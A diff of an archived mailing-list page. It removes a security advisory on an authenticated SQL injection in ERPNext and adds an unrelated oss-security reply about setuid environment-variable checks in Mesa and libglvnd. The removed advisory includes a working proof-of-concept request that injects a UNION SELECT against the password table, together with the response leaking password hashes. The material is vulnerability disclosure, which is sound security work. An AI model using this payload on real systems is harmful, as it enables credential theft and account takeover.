@@ -1,126 +1,63 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/11/7
-Message-ID: <IV6PM0BF5xvdzKqp9Gl1kRbVbEwYHfBEis05qRSkaueB_f4cQIXWBj1jnUqgcX6lQ3ezklmmLiAv-y93PQVQwzIGIcu46GPqBbu57QP8nkI=@trovent.io>
-Date: Tue, 11 May 2021 11:45:56 +0000
-From: Stefan Pietsch <s.pietsch@...vent.io>
-To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>, "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>, "submissions@...ketstormsecurity.com" <submissions@...ketstormsecurity.com>
-Subject: Trovent Security Advisory 2103-01 / Authenticated SQL injection in ERPNext 13.0.0/12.18.0
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/04/18/5
+Message-ID: <20210418125151.GA20535@openwall.com>
+Date: Sun, 18 Apr 2021 14:51:52 +0200
+From: Solar Designer <solar@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: xscreensaver package caps gets raw socket
 Content-Type: text/plain; charset=utf-8
 
-# Trovent Security Advisory 2103-01 #
-#####################################
+On Sat, Apr 17, 2021 at 09:51:38PM -0300, Érico Nogueira wrote:
+> Em 17/04/2021 11:31, Tavis Ormandy escreveu:
+> >Summary of discussion so far:
+> >
+> >- In theory, mesa support running in a privileged context, their
+> >   documentation says they disable dangerous features in setuid/setgid
+> >   binaries:
+> >
+> >     https://mesa-docs.readthedocs.io/en/latest/egl.html
+> >
+> >   In fact, this is broken because they only check if (geteuid() !=
+> >   getuid()) { ... }. That check doesn't even handle setgid, let alone file
+> >   caps. If mesa agree this is a bug, simply changing their checks to if
+> >   (getauxval(AT_SECURE)) { ... } might make this bug go away, and handle
+> >   file caps and setgid for free. I filed a bug for that, but there
+> >   hasn't been a response:
+> >   https://gitlab.freedesktop.org/mesa/mesa/-/issues/4549
+> 
+> The linked issue appears to be private... Not sure it makes sense, since 
+> the problem has been explained in this public email. FWIW, libglvnd has 
+> the same issue, though it at leasts (E)GID as well. Sending it here 
+> because I couldn't find a security contact.
+> 
+> https://github.com/NVIDIA/libglvnd/blob/acc654454867c7cdd681cc1f60f858bcd6e5e729/src/EGL/libeglvendor.c
+> 
+>     if (getuid() == geteuid() && getgid() == getegid()) {
+>         env = getenv("__EGL_VENDOR_LIBRARY_FILENAMES");
+>     }
+> 
+> I will look into opening an issue with them and finding a fix.
 
+Related:
 
-Authenticated SQL injection in ERPNext 13.0.0/12.18.0
-#####################################################
+https://www.openwall.com/lists/oss-security/2019/12/04/6
 
+"search for LIBGL_DRIVERS_PATH finds that Mesa appears to have the same
+issue, and it also finds that we should also search for GBM_DRIVERS_PATH
+(apparently, for older Mesa) and maybe EGL_DRIVERS_PATH and EGL_DRIVER,
+and LIBVA_DRIVERS_PATH and LIBVA_DRIVER_NAME.  There are probably more."
 
-Overview
-########
+> Using `secure_getenv` in some of these cases would probably work as well 
+> as checking `getauxval(AT_SECURE)`, especially because it seems (from my 
+> quick search over at <https://man.bsd.lv>) that both are Linux specific 
+> anyway.
+> 
+> It would be nice to define a `is_privileged_context()` function that 
+> works on most platforms to be shared across projects or used as a 
+> library.
 
-Advisory ID: TRSA-2103-01
-Advisory version: 1.0
-Advisory status: Public
-Advisory URL: https://trovent.io/security-advisory-2103-01
-Affected product: ERPNext
-Tested versions: 12.18.0 and 13.0.0 beta
-Vendor: Frappé Technologies https://frappe.io
-Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch
+Historically, that's __libc_enable_secure on glibc (although if
+secure_getenv() does what's needed in a given context, then you don't
+need to use __libc_enable_secure directly) and issetugid(2) on OpenBSD.
 
-
-Detailed description
-####################
-
-Trovent Security GmbH discovered an SQL Injection vulnerability
-in the "frappe.model.db_query.get_list" API endpoint.
-On version 13.0.0 valid credentials without any privileges are sufficient
-but on version 12.18.0 at least "system_user" privileges are required.
-The vulnerable parameter "filters" allows injection of SQL statements.
-An attacker is able to query all available database tables to retrieve
-usernames, password hashes or password reset tokens which can then be used
-to reset administrator passwords.
-
-
-Severity: High
-CVSS Score: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
-CWE ID: 89
-CVE ID: TBD
-
-
-Proof of concept
-################
-
-Sample request made with a non system account to retrieve password hashes:
-
-REQUEST:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-GET /api/method/frappe.model.db_query.get_list?filters=%7b%22name%20UNION%20SELECT%20password%20from%20%60__Auth%60%20--%20%22%3a%20%22administrator%22%7d&fields=%5b%22name%22%5d&doctype=User&limit=20'%3b%20do%20sleep(10)&order_by=name&_=1615372773071 HTTP/1.1
-Host: erpnext.local
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-Accept: application/json
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-X-Frappe-CSRF-Token: 0e89c5c43898da856fe12e19a57991d7bdf380477d0354f93ce6bcf3
-X-Frappe-CMD:
-X-Frappe-Doctype: Dashboard%20Settings
-X-Requested-With: XMLHttpRequest
-Connection: close
-Referer: http://erpnext.local/app/website
-Cookie: io=NVosyhHCvV3KdkxNAAi7; sid=26f7ddefef642c0f88b9babfc26b751229c32b565304f30815d8ec22; system_user=no; full_name=auth%20test%27; user_id=auth%40trovent.io; user_image=
-
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-
-RESPONSE:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-HTTP/1.1 200 OK
-Server: nginx/1.19.7
-Date: Wed, 10 Mar 2021 16:04:40 GMT
-Content-Type: application/json
-Connection: close
-Vary: Accept-Encoding
-Set-Cookie: sid=26f7ddefef642c0f88b9babfc26b751229c32b565304f30815d8ec22; Expires=Sat, 13-Mar-2021 16:04:40 GMT; HttpOnly; Path=/; SameSite=Lax
-Set-Cookie: system_user=no; Path=/; SameSite=Lax
-Set-Cookie: full_name=auth%20test%27; Path=/; SameSite=Lax
-Set-Cookie: user_id=auth%40trovent.io; Path=/; SameSite=Lax
-Set-Cookie: user_image=; Path=/; SameSite=Lax
-X-Frame-Options: SAMEORIGIN
-Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
-X-Content-Type-Options: nosniff
-X-XSS-Protection: 1; mode=block
-Content-Length: 719
-
-{"message":[{"name":"$pbkdf2-sha256$29000$0fofo/SeE0IoRQgh5HyvVQ$IuyDVu5v4Hc4Z7Pe/3Tvpim7AdhbYrI9b9XXL39/tVU"},{"name":"$pbkdf2-sha256$29000$1vqfk3KO0ZqT8n7vvff.nw$A9a6k9wbegrw5QUiJ/jj1.kXCr.lwRSJtv5S7QTCQgU"},{"name":"$pbkdf2-sha256$29000$aA2B8P7/X.vd./.fM6aUkg$JluCIXXrUgKxTUwvRyveCRIDjJ0mhhoG9Cs6onAO2Do"},{"name":"$pbkdf2-sha256$29000$CSFEKCVEqPVe611rrdVayw$pFf/iBuprNIdZ4DoJadro0UUNaffy.2v5EbAe4Nbxco"},{"name":"$pbkdf2-sha256$29000$L2WMkdLaG2NM6V3rnXMOAQ$snURvXF1kNTGA7Zux.HLoQ5JISRajyOBiAZ1VDjEJnc"},{"name":"$pbkdf2-sha256$29000$r/UeQ.id0/rfm9M6Z4yR8g$1w/oAvTRNJ7wKuSHgZ.4jkDHQAvLLYxerzYeHpd1IV8"},{"name":"gAAAAABgP1dTiYpJ67JyyUjytcay4XmKoOuyf_jAke7slDwL4gIM5lCWCbu6SjYOPOX6WigAm0fZzGgTEIiXNCA_yPZI64ijmA=="}]}
-
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-Solution / Workaround
-#####################
-
-To mitigate this vulnerability, we recommend to limit access to the affected API endpoint.
-As a permanent solution it is recommended not to insert user input directly into SQL queries.
-
-
-History
-#######
-
-2021-03-10: Vulnerability found
-2021-03-11: Advisory created and vendor contacted
-2021-03-22: Vendor replied that they request CVE IDs after a fix is released
-2021-04-19: Vendor informed about planned disclosure date (2021-05-11)
-2021-05-03: Vendor contacted, asking for status
-2021-05-07: No reply from vendor, vendor contacted again
-2021-05-11: Advisory published
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (856 bytes)
+Alexander
